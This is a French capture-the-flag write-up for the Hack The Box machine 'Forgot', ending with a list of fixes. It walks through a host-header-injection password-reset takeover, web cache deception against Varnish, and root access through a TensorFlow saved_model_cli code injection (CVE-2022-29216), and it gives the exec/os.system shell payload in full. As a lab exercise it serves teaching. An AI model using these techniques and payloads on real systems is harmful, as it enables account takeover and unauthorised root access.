
<a href="https://app.hackthebox.com/machines/511"><img src="https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/Forgot.png" alt="Forgot"></a>

Link : https://app.hackthebox.com/machines/511


# NMAP

```bash
$ sudo nmap -sC -sV -oA nmap/initialScan 10.129.228.104
```
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-20 08:39 GMT
Nmap scan report for 10.129.228.104
Host is up (0.089s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
|_http-title: Login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 20 Mar 2023 08:39:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 32778
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 20 Mar 2023 08:39:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 5
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 20 Mar 2023 08:39:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     X-Varnish: 32774
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=3/20%Time=64181BCD%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1DE,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.1\.2\x2
SF:0Python/3\.8\.10\r\nDate:\x20Mon,\x2020\x20Mar\x202023\x2008:39:42\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:20219\r\nLocation:\x20http://127\.0\.0\.1\r\nX-Varnish:\x205\r\nAge:\x2
SF:00\r\nVia:\x201\.1\x20varnish\x20\(Varnish/6\.2\)\r\nConnection:\x20clo
SF:se\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecting\.\.
SF:\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x20redir
SF:ected\x20automatically\x20to\x20the\x20target\x20URL:\x20<a\x20href=\"h
SF:ttp://127\.0\.0\.1\">http://127\.0\.0\.1</a>\.\x20If\x20not,\x20click\x
SF:20the\x20link\.\n")%r(HTTPOptions,117,"HTTP/1\.1\x20200\x20OK\r\nServer
SF::\x20Werkzeug/2\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2020\x20Mar\
SF:x202023\x2008:39:42\x20GMT\r\nContent-Type:\x20text/html;\x20charset=ut
SF:f-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x200\r\nX-
SF:Varnish:\x2032774\r\nAge:\x200\r\nVia:\x201\.1\x20varnish\x20\(Varnish/
SF:6\.2\)\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n")%r(R
SF:TSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(FourOhFou
SF:rRequest,1BE,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2
SF:\.1\.2\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2020\x20Mar\x202023\x2008:3
SF:9:47\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-
SF:Length:\x20207\r\nX-Varnish:\x2032778\r\nAge:\x200\r\nVia:\x201\.1\x20v
SF:arnish\x20\(Varnish/6\.2\)\r\nConnection:\x20close\r\n\r\n<!doctype\x20
SF:html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x
SF:20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x
SF:20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20
SF:please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(
SF:SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.19 seconds
```


# Browse


![HTTP_login.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_login.png)



<details open="">
	<summary>Wappalyzer</summary>
 

| URL | Analytics | Web frameworks | Web servers | Caching | JavaScript graphics | Programming languages | CDN | Marketing automation | Live chat |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| http://forgot.htb | HubSpot Analytics | Flask | Flask | Varnish | Highcharts | Python | Unpkg | HubSpot | HubSpot Chat |

</details>
  

<details open="">
	<summary>Source Code</summary>

![HTTP_sourceCode.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_sourceCode.png)


</details>

### Creds

| user | password | service | origine
| --- | --- | --- | --- |
| robert-dev-14320 | | | source code page /home |


---

# Gobuster

```bash
$ gobuster dir -u http://forgot.htb/ -w /usr/share/wordlists/dirb/common.txt -o gobuster/commun.txt
```
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://forgot.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/20 10:10:36 Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 302) [Size: 189] [--> /]
/forgot               (Status: 200) [Size: 5227]       
/login                (Status: 200) [Size: 5189]       
/tickets              (Status: 302) [Size: 189] [--> /]
                                                       
===============================================================
2023/03/20 10:11:13 Finished
===============================================================

```



# Burp 

<details open="">
	<summary>/home</summary>



![BURP_redirecting_home.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/BURP_redirecting_home.png)




</details>


# Host Header Injection 
L'injection de l'en-tête d'hôte (ou "host header injection" en anglais) est une vulnérabilité de sécurité web qui permet à un attaquant de manipuler l'en-tête d'hôte d'une requête HTTP. L'en-tête d'hôte (`Host:`) est utilisée pour identifier le nom de domaine d'un serveur web et permet de diriger la requête vers le bon serveur.

Cette technique peut être utilisée pour mener des attaques de phishing, d'usurpation d'identité ou pour contourner les mécanismes de sécurité qui sont basés sur le nom de domaine.

La page `/home` du site nous redirige vers la racine du site `/`.

Nous pouvons alors essayer de rediriger la page sur notre webserver 

Avant tout, nous allons lancer Netcat qui va écouter le port 4444 :

```bash
$ sudo nc -lnvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

```

Nous allons envoyer une requête


![BURP_request_redirection.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/BURP_request_redirection.png)

On fait suivre la redirection vers notre adresse IP 



![BURP_requet_follow.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/BURP_requet_follow.png)






Netcat :

```bash
Ncat: Connection from 10.10.14.41.
Ncat: Connection from 10.10.14.41:49540.
GET / HTTP/1.1
Host: 10.10.14.41:4444
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Referer: http://forgot.htb/

```

Nous avons bien une injection de l'en-tête d'hôte.

Essayons d'envoyer une autre requête mais cette fois-ci avec la page `/forgot` avec le nom d'utilisateur 'robert-dev-14320' :
 - Netcat : 
	```bash
	$ sudo nc -lnvp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	Ncat: Listening on 0.0.0.0:4444

	```

- Firefox :

	![HTTP_reset_robert.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_reset_robert.png)


- On intercepte et modifie la requête (`Host : <notre adresse IP>`) :

	![BURP_intercept_resetInjection.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/BURP_intercept_resetInjection.png)


- On regarde la sortie Netcat :

	```bash
	Ncat: Connection from 10.129.228.104.
	Ncat: Connection from 10.129.228.104:40806.
	GET /reset?token=GgUm6x3aUI%2BEdONpBIv8cpysJUeY70bbJVfFAfHYIP04XDpSiu0CEMQ9GQnE2oMCT%2BMD8D5%2FAZr5H%2BNjvIYrEQ%3D%3D HTTP/1.1
	Host: 10.10.14.41:4444
	User-Agent: python-requests/2.22.0
	Accept-Encoding: gzip, deflate
	Accept: */*
	Connection: keep-alive

	```

Nous venons de trouver le lien pour changer le mot de passe du l'utilisateur 'robert-dev-14320'.


> forgot.htb/reset?token=GgUm6x3aUI%2BEdONpBIv8cpysJUeY70bbJVfFAfHYIP04XDpSiu0CEMQ9GQnE2oMCT%2BMD8D5%2FAZr5H%2BNjvIYrEQ%3D%3D

Changeons le mot de passe en 'password' :



![HTTP_newPassword.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_newPassword.png)


Connectons nous avec le nouveau mot de passe de 'robert-dev-14320' :
 >robert-dev-14320:password



![HTTP_login_robert.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_login_robert.png)





![HTTP_login_succes.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_login_succes.png)






### Explications :
Les injections d'en-tête d'hôte permettent de manipuler l'en-tête d'hôte d'une requête HTTP et ainsi se faire passer pour un autre domaine. 
Les filtres d'e-mail peuvent automatiquement suivre les liens dans les e-mails qu'ils analysent pour vérifier s'ils ont du contenu malveillant. 
Cela peut permettre d'utiliser des injections d'en-tête d'hôte pour rediriger ses filtres vers notre serveur web, même si l'utilisateur n'a pas cliqué sur le lien suspect présent dans l'e-mail.
Voilà pourquoi nous avons reçu un 'reset?token' sans que l'utilisateur n'ait à cliquer sur le lien reçu par e-mail.


# Browse


- /tickets :
	
	![HTTP_tickets.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_tickets.png)
		
	En analysant le code source du site nous pouvons voir un élément d'ancrage qui renvoie à une certaine page admin_tickets
à laquelle nous n'avons pas accès.
	![BURP_admintickets.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/BURP_admintickets.png)

- /admin_tickets :
	
	![HTTP_admin-tickets_notFound.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_admin-tickets_notFound.png)


	[Varnish](https://fr.wikipedia.org/wiki/Varnish) est un serveur de cache HTTP. Nous allons utiliser une technique d'attaque appelée '**Web Cache Deception**'. 
	C'est une technique qui permet de manipuler une requête HTTP pour tromper un serveur cache (comme Varnish) afin qu'il renvoie des informations sensibles stockées sur le serveur Web d'origine. 
	
	Nous allons envoyer un ticket avec le lien `http://<ip_website>/admin_tickets/static/test/test` :

	![HTTP_reqetTickets_admin.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_reqetTickets_admin.png)

	Maintenant, nous attendons quelques secondes et nous nous rendons sur la page `http://forgot.htb/admin_tickets/static/test/test`:
	> répéter cette étape 2 fois (une premiere fois pour mettre en cache et une seconde pour afficher le ticket)
	
	![HTTP_admin-tickets_test_test.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_admin-tickets_test_test.png)
	


# SSH

Nous ponvons essayer de nous connecter avec les identifiants de 'diego' trouvés juste avant :

```bash
$ ssh diego@forgot.htb
The authenticity of host 'forgot.htb (10.129.228.104)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'forgot.htb,10.129.228.104' (ECDSA) to the list of known hosts.
diego@forgot.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-132-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 20 Mar 2023 01:32:21 PM UTC

  System load:           0.0
  Usage of /:            78.4% of 8.72GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             221
  Users logged in:       0
  IPv4 address for eth0: 10.129.228.104
  IPv6 address for eth0: dead:beef::250:56ff:fe96:7e59


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Nov 18 10:51:30 2022 from 10.10.14.40
```
```bash
diego@forgot:~$ whoami
diego
```
---
# User Flag
```bash
diego@forgot:~$ ls
app  bot.py  snap  user.txt
```

<details>
	<summary>User Flag</summary>

```bash
diego@forgot:~$ cat user.txt 
<***User_FLAG***>
```

</details>

---
# Privesc

- sudo -l
	```bash
	diego@forgot:~$ sudo -l
	Matching Defaults entries for diego on forgot:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User diego may run the following commands on forgot:
		(ALL) NOPASSWD: /opt/security/ml_security.py

	```

<details close="">
	<summary>ml_security.py</summary>

```python
#!/usr/bin/python3
import sys
import csv
import pickle
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

np.random.seed(42)

f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'

# load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")

# Create a function to convert an array of strings to a set of features
def getVec(text):
    features = []
    for i, line in enumerate(text):
        test_data = word_tokenize(line.lower())
        v1 = model.infer_vector(test_data)
        featureVec = v1
        lineDecode = unquote(line)
        lowerStr = str(lineDecode).lower()
        feature1 = int(lowerStr.count('link'))
        feature1 += int(lowerStr.count('object'))
        feature1 += int(lowerStr.count('form'))
        feature1 += int(lowerStr.count('embed'))
        feature1 += int(lowerStr.count('ilayer'))
        feature1 += int(lowerStr.count('layer'))
        feature1 += int(lowerStr.count('style'))
        feature1 += int(lowerStr.count('applet'))
        feature1 += int(lowerStr.count('meta'))
        feature1 += int(lowerStr.count('img'))
        feature1 += int(lowerStr.count('iframe'))
        feature1 += int(lowerStr.count('marquee'))
        # add feature for malicious method count
        feature2 = int(lowerStr.count('exec'))
        feature2 += int(lowerStr.count('fromcharcode'))
        feature2 += int(lowerStr.count('eval'))
        feature2 += int(lowerStr.count('alert'))
        feature2 += int(lowerStr.count('getelementsbytagname'))
        feature2 += int(lowerStr.count('write'))
        feature2 += int(lowerStr.count('unescape'))
        feature2 += int(lowerStr.count('escape'))
        feature2 += int(lowerStr.count('prompt'))
        feature2 += int(lowerStr.count('onload'))
        feature2 += int(lowerStr.count('onclick'))
        feature2 += int(lowerStr.count('onerror'))
        feature2 += int(lowerStr.count('onpage'))
        feature2 += int(lowerStr.count('confirm'))
        # add feature for ".js" count
        feature3 = int(lowerStr.count('.js'))
        # add feature for "javascript" count
        feature4 = int(lowerStr.count('javascript'))
        # add feature for length of the string
        feature5 = int(len(lowerStr))
        # add feature for "<script"  count
        feature6 = int(lowerStr.count('script'))
        feature6 += int(lowerStr.count('<script'))
        feature6 += int(lowerStr.count('&lt;script'))
        feature6 += int(lowerStr.count('%3cscript'))
        feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
        # add feature for special character count
        feature7 = int(lowerStr.count('&'))
        feature7 += int(lowerStr.count('<'))
        feature7 += int(lowerStr.count('>'))
        feature7 += int(lowerStr.count('"'))
        feature7 += int(lowerStr.count('\''))
        feature7 += int(lowerStr.count('/'))
        feature7 += int(lowerStr.count('%'))
        feature7 += int(lowerStr.count('*'))
        feature7 += int(lowerStr.count(';'))
        feature7 += int(lowerStr.count('+'))
        feature7 += int(lowerStr.count('='))
        feature7 += int(lowerStr.count('%3C'))
        # add feature for http count
        feature8 = int(lowerStr.count('http'))
        
        # append the features
        featureVec = np.append(featureVec,feature1)
        featureVec = np.append(featureVec,feature2)
        featureVec = np.append(featureVec,feature3)
        featureVec = np.append(featureVec,feature4)
        featureVec = np.append(featureVec,feature5)
        featureVec = np.append(featureVec,feature6)
        featureVec = np.append(featureVec,feature7)
        featureVec = np.append(featureVec,feature8)
        features.append(featureVec)
    return features


# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='<***Passord_diego***>')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
conn.close()
data=[]
for i in r:
        data.append(i)
Xnew = getVec(data)

#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)

# show the sample inputs and predicted outputs
def assessData(i):
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:
        try:
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:
                pass

for i in range(len(Xnew)):
     t = threading.Thread(target=assessData, args=(i,))
#     t.daemon = True
     t.start()
```

</details>



Nous allons vérifier que python3 contient bien la librairie 'tensorflow' :
```bash
diego@forgot:~$ python3 -c 'import tensorflow as tf; print(tf.__version__)' 2>/dev/null
2.6.3
```
Nous pouvons trouver sur internet une injection de code sur 'saved_model_cli' dans 'TensorFlow':

- [CVE-2022-29216](https://github.com/advisories/GHSA-75c9-jrh4-79mc)

L'exploit trouvé utilise une injection qui va ouvrir un reverse shell, 
nous allons adapter l'injection :

```
test=exec("""\nimport os\nos.system('/bin/sh')""")#<script>alert()</script>
```


Une fois que le script 'ml_security.py' aura detecté notre injection `#<script>alert()</script>`, 
Il lancera la commande `import os; os.system('/bin/sh')` avec les droits 'root' puisque le script peut se lancer avec 'sudo'.


Nous allons soumettre un nouveau ticket mais cette fois-ci avec notre payload :



![HTTP_payload.png](https://github.com/RawMain121/writeups/blob/main/HackTheBox/Forgot/_resources/HTTP_payload.png)

Une fois le payload envoyé, nous pouvons lancer le script '**ml_security.py**' :


```bash
$ sudo /opt/security/ml_security.py 
2023-03-20 14:57:48.359173: W tensorflow/stream_executor/platform/default/dso_loader.cc:64] Could not load dynamic library 'libcudart.so.11.0'; dlerror: libcudart.so.11.0: cannot open shared object file: No such file or directory
2023-03-20 14:57:48.359217: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
# id
uid=0(root) gid=0(root) groups=0(root)
```
Nous voilà administrateur de la machine !

# Root Flag
```bash
# cd
# ls
nltk_data  root.txt  snap
# cat root.txt
<***ROOT_FLAG***>
```



---
# Fix

- Supprimer les commentaires sensibles
- Changer les identifiants de l'utilisateur '**robert-dev-14320**' 
	> 'robert-dev-14320' a été trouvé dans le code source du site, une simple suppression de commentaire ne suffit pas. 
	> Il est facile de retrouver ce commentaire grâce à des sites comme [WayBackMachine](https://archive.org/web/). 
	> Ce site archive régulièrement des captures d'écran de pages web à partir de différents moments dans le temps, permettant aux utilisateurs de voir à quoi ressemblait un site web à une date donnée dans le passé.

- **Host Header Injection** :
Pour se protéger contre les attaques d'injection d'en-tête d'hôte, les développeurs doivent s'assurer que les en-têtes d'hôte sont correctement validées et filtrées, et ne doivent pas faire confiance aux en-têtes d'hôte fournis par l'utilisateur. Les administrateurs de serveurs web peuvent également mettre en place des configurations de sécurité pour bloquer les requêtes avec des en-têtes d'hôte suspectes ou malveillantes.

- Mettre à jour **TensorFlow**.
	
